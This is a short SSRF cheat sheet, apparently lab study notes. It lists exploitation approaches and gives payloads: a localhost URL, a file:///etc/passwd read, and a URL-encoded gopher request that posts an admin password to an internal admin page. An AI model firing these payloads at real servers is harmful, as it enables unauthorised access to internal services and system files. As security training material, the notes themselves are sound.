# Server-side Request Forgery
- **Exploitation**
    - Accessing restricted endpoints
    - Internal portscan by accessing ports on localhost
    - Local File Inclusion (LFI)
    - The gopher Protocol using [Gopherus](https://github.com/tarunkant/Gopherus)

|Protocols|	
|---------|
|http://127.0.0.1/|
|file:///etc/passwd|
|gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin|

## Resources
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)